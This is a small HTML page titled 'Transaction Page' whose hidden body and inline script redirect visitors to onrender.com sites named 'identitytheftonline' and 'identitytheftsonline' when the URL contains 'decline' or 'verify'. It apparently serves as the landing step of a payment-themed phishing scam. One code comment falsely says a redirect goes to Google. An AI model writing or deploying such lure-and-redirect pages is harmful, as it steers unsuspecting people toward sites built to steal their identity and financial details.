<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Transaction Page</title>
    <style>
        body {
            display: none; /* Hide content initially */
        }
    </style>
</head>
<body>

    <script>
        // Check if the URL contains 'decline' or 'verify'
        var currentUrl = window.location.href;
        
        if (currentUrl.includes('decline')) {
            document.body.style.display = 'block'; // Show content if 'decline' is found in URL
            setTimeout(function() {
                window.location.href = 'https://identitytheftonline.onrender.com'; // Redirect to your desired URL
            }, 3000); // 3 seconds delay
        } else if (currentUrl.includes('verify')) {
            setTimeout(function() {
                window.location.href = 'https://identitytheftsonline.onrender.com'; // Redirect to Google if 'verify' is found
            }, 1000); // 1 second delay
        }
    </script>

</body>
</html>
